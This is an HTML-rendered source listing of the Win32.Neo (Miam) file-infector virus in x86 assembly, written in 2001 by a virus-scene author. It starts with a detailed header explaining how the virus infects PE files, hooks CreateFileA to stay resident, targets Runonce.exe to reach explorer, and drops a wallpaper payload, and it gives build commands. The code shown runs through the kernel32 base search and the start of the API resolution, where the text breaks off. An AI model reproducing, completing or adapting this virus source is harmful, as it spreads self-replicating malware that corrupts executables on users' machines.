<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Miam.5164 - neo.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                  €      €  €€€€€   €€€€€</span><span class="sc0">
</span><span class="sc1">; win32.Neo by TiPiaX/VDS - 2001                   €      €  €    €  €</span><span class="sc0">
</span><span class="sc1">; Final Version                                    €€    €€  €    €  €€€€€</span><span class="sc0">
</span><span class="sc1">;                                                   €€  €€   €    €      €</span><span class="sc0">
</span><span class="sc1">; http://www.multimania.com/tipiax                   ﬂ€€ﬂ    €€€€€   €€€€€</span><span class="sc0">
</span><span class="sc1">; vxer@caramail.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (win32.Neo = win32.Miam for AVP)</span><span class="sc0">
</span><span class="sc1">; I'm proud to present you my first real win32 virus.</span><span class="sc0">
</span><span class="sc1">; It's not a fantastic virus but i am not old in the scene so don't blame me.</span><span class="sc0">
</span><span class="sc1">; This virus uses per-process residency method in order to infect the files</span><span class="sc0">
</span><span class="sc1">; that the user uses the most.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When the virus starts the first time, it looks in kernel32, user32, advapi32 and</span><span class="sc0">
</span><span class="sc1">; saves all the Apis adresses needed, then it infects all the current directory</span><span class="sc0">
</span><span class="sc1">; and files in the windows directory.</span><span class="sc0">
</span><span class="sc1">; The virus does not infect all the windows directory, it infects files like notepad.exe</span><span class="sc0">
</span><span class="sc1">; and calc.exe because infecting all this directory is not very stealth (it is slow).</span><span class="sc0">
</span><span class="sc1">; It infects the file Runonce.exe because this file is loaded before explorer.exe</span><span class="sc0">
</span><span class="sc1">; and it can infect the explorer.</span><span class="sc0">
</span><span class="sc1">; If it is the first generation, the virus displays a message.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the virus increases last section when it infects a file.</span><span class="sc0">
</span><span class="sc1">; It infects only PE files, and it makes all sections read/write/exec.</span><span class="sc0">
</span><span class="sc1">; When the infected programm starts, the virus look in the Import Table</span><span class="sc0">
</span><span class="sc1">; and try to hook CreateFileA.</span><span class="sc0">
</span><span class="sc1">; When CreateFileA is hooked, the virus infect all the directory where the</span><span class="sc0">
</span><span class="sc1">; opened file is located.</span><span class="sc0">
</span><span class="sc1">; The infection mark is a little smiley in the file (i love that, it makes me</span><span class="sc0">
</span><span class="sc1">; think of a real life ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Payload: the virus drops a bitmap file in the c:\ directory, then</span><span class="sc0">
</span><span class="sc1">; it changes screen background to black and shows the gfx "WAKE UP NEO" :p </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I saw many per-process resident virus, but they never change the Import Table</span><span class="sc0">
</span><span class="sc1">; characteristics. And if the Import Table has not the flag write it will crash.</span><span class="sc0">
</span><span class="sc1">; someone said me it was always writeable but look in notepad.exe for example,</span><span class="sc0">
</span><span class="sc1">; it's not writeable.</span><span class="sc0">
</span><span class="sc1">; the section which contain the import table has not always the same name, so this</span><span class="sc0">
</span><span class="sc1">; virus changes all the sections characteristics to read/write/exec.</span><span class="sc0">
</span><span class="sc1">; I'm sorry but all the comments are in french. ( it's difficult for me</span><span class="sc0">
</span><span class="sc1">; to speak english )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus erase few bytes of the first section of the executable with some code.</span><span class="sc0">
</span><span class="sc1">; this code jump to the virus with a jmp. The erased code is saved before in a</span><span class="sc0">
</span><span class="sc1">; buffer, and when the virus starts the original code is restored.</span><span class="sc0">
</span><span class="sc1">; There is a SEH in the infection proc.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Greetz:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; #virus    : hello !</span><span class="sc0">
</span><span class="sc1">; #vxers    : My favorite channel</span><span class="sc0">
</span><span class="sc1">; #crack.fr : where it all began</span><span class="sc0">
</span><span class="sc1">; #fcf      : where i can sleep :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; QuantumG  : BIG GREETZ to you for testing this virus and saying me</span><span class="sc0">
</span><span class="sc1">;             what was wrong. thx</span><span class="sc0">
</span><span class="sc1">; Mandag0re : give me the knowledge !</span><span class="sc0">
</span><span class="sc1">; Bendi     : Thanks for your Clem Virus</span><span class="sc0">
</span><span class="sc1">; Del_Armg0 : i love Matrix</span><span class="sc0">
</span><span class="sc1">; Christal  : you are a cracking god</span><span class="sc0">
</span><span class="sc1">; Pointbat  : Where are you ?</span><span class="sc0">
</span><span class="sc1">; Drak      : my friend</span><span class="sc0">
</span><span class="sc1">; Androgyne : VDS POWAAAAHHH</span><span class="sc0">
</span><span class="sc1">; Artif     : Don't stop cracking</span><span class="sc0">
</span><span class="sc1">; defconkill: your homepage is great</span><span class="sc0">
</span><span class="sc1">; Kahel     : Thanks for your help for Hccc!</span><span class="sc0">
</span><span class="sc1">; Nostra    : no, it's not the end of the world !</span><span class="sc0">
</span><span class="sc1">; CoolViper : You are a cool guy :)</span><span class="sc0">
</span><span class="sc1">; LordJulus : I learned with your tutorials</span><span class="sc0">
</span><span class="sc1">; MinoThauR : you are just a legend ;)</span><span class="sc0">
</span><span class="sc1">; Analyst   : I hope you will enjoy this virus</span><span class="sc0">
</span><span class="sc1">; Lunatic   : Hack the planet</span><span class="sc0">
</span><span class="sc1">; MrPhilex  : I love your homepage ;)</span><span class="sc0">
</span><span class="sc1">; Sboub     : And your irc client ?</span><span class="sc0">
</span><span class="sc1">; Roy       : you are a really good coder</span><span class="sc0">
</span><span class="sc1">; Kerberos  : OpenGl Powaaaahhh</span><span class="sc0">
</span><span class="sc1">; Unk       : When will you write a virus ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; just a little thing: Mist is a big shit !</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Pour compiler:</span><span class="sc0">
</span><span class="sc1">; tasm32 -ml -m5 -q neo.asm</span><span class="sc0">
</span><span class="sc1">; tlink32 -Tpe -aa -x -c neo.obj ,,,import32</span><span class="sc0">
</span><span class="sc1">; pewrsec neo.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">

</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">LMEM_FIXED</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LMEM_ZEROINIT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">LPTR</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">LMEM_FIXED</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc0">

</span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">
</span><span class="sc5">KEY_SET_VALUE</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">REG_SZ</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">TAILLE_VIRUS</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">TAILLE_BMP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bitmap_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bitmap_start</span><span class="sc4">)</span><span class="sc0">

                                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">                        </span><span class="sc9">STRUC</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; structure filetime</span><span class="sc0">
    </span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">                        </span><span class="sc9">ENDS</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">win32_find_data</span><span class="sc0">                 </span><span class="sc9">STRUC</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">FileAttributes</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; les attributs</span><span class="sc0">
    </span><span class="sc5">CreationTime</span><span class="sc0">            </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; date de crÈation</span><span class="sc0">
    </span><span class="sc5">LastAccessTime</span><span class="sc0">          </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; dernier acces</span><span class="sc0">
    </span><span class="sc5">LastWriteTime</span><span class="sc0">           </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; derniere modification</span><span class="sc0">
    </span><span class="sc5">FileSizeHigh</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; taille du fichier</span><span class="sc0">
    </span><span class="sc5">FileSizeLow</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; taille du fichier</span><span class="sc0">
    </span><span class="sc5">Reserved0</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">Reserved1</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">FileName</span><span class="sc0">                </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; nom long de fichier</span><span class="sc0">
    </span><span class="sc5">AlternateFileName</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; nom court de fichier</span><span class="sc0">
                                </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; padding</span><span class="sc0">
</span><span class="sc5">win32_find_data</span><span class="sc0">                 </span><span class="sc9">ENDS</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">SYSTEMTIME</span><span class="sc0">          </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc5">wYear</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wMonth</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wDayOfWeek</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wDay</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wHour</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wMinute</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wSecond</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wMilliseconds</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SYSTEMTIME</span><span class="sc0">          </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">signature</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Win32.Neo Virus by [TiPiaX/VDS]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">petitmessage</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Miam ! I love PE files ;)"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Corps du programme</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; edx est une valeur du kernel</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">       </span><span class="sc1">; Calcul du delta offset : ebp = decalage</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; EntryPoint en eax au dÈmarrage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RestoreHost</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; replace les bits virÈs avec l'epo</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; et sauve la valeur de retour</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetKernel</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; choppe l'adresse du kernel</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; choppe l'adresse de GetProcAddress</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetAPIs</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; choppe les adresses des APIs voulues</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GoResident</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; On se met resident (per-process)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Infecte_Dir</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; On part ‡ l'infection</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfecteWinFiles</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; on se fait quelques fichiers dans windows</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Payload</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Le Payload</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">goodbye</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; exe de dÈpart ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">firstgen</span><span class="sc0">            </span><span class="sc1">; oui, on saute</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THEENTRYPOINT</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; prend l'ancien entry point</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; et on ÈxÈcute le prog hÙte</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">firstgen</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">petitmessage</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">signature</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   GetKernel PROC</span><span class="sc0">
</span><span class="sc1">;   input:      edx = adresse appartenant au kernel</span><span class="sc0">
</span><span class="sc1">;   output:     kernel32 et PeHeader</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">GetKernel</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; On sauve cette valeur dans eax</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">          </span><span class="sc1">; On diminue la recherche</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">boucle</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; un cran de moins</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">        </span><span class="sc1">; Cherche le MZ Header</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">boucle</span><span class="sc0">              </span><span class="sc1">; on repart</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">MZ_found</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; ecx = adresse du MZ.</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ecx = adresse du PE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; on aligne</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">boucle</span><span class="sc0">              </span><span class="sc1">; vÈrifie que c'est une adresse valide</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">       </span><span class="sc1">; On a le PeHeader ?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">boucle</span><span class="sc0">              </span><span class="sc1">; Non ! on repart</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; stocke l'ImageBase du kernel</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PeHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; stocke L'ImageBase du PeHeader</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetKernel</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   GetProcA PROC</span><span class="sc0">
</span><span class="sc1">;   input:      kernel32 et PeHeader</span><span class="sc0">
</span><span class="sc1">;   output:     AGetProcAddress = adresse de GetProcAddress</span><span class="sc0">
</span><span class="sc1">;   Succes : EAX = adresse de GetProcAddress    Failed : EAX = 0</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">GetProcA</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PeHeader</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EDI = adresse du PeHeader</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">78H</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; 78H = addresse de l'export table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; on normalise</span><span class="sc0">
